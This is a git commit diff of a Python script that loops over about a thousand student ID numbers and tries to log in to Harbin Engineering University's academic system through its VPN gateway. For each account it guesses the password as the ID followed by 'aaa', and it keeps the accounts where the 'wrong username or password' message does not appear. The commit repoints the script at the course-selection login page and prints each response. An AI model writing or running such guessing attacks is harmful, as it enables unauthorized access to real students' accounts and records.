64b7044b0a41dfdfcd133743fbfd976e7e8a559a
taogewins <taogewins@outlook.com>
2017-07-13 14:57:53 +0800

    finish outweblink

--- tuiclass/TuiKe_(out_web).py
+++ tuiclass/TuiKe_(out_web).py
@@ -5,7 +5,8 @@ fo = open("list.txt", "wb+")
 cnt = 0
 for i in range(2015201101, 2015202131):
     s = OutNetLink.getConn()
-    url = 'https://ssl.hrbeu.edu.cn/web/1/http/0/edusys.hrbeu.edu.cn/jsxsd/index.jsp'
+    url = 'https://ssl.hrbeu.edu.cn/web/1/http/1/edus' \
+          'ys.hrbeu.edu.cn/jsxsd/xk/LoginToXk'
     zh = str(i).encode(encoding="utf-8")
     psw = str(str(i) + 'aaa').encode(encoding="utf-8")
     arg = base64.b64encode(zh) + str('%%%').encode(encoding="utf-8") + base64.b64encode(psw)
@@ -15,8 +16,7 @@ for i in range(2015201101, 2015202131):
         'encoded': arg
     }
     cur = s.post(url=url, data=data)
-    # print(cur.text)
-
+    print(cur.text)
     fi = re.search(u'用户名或密码错误', cur.text)
     # print(fi)
     if fi is None:
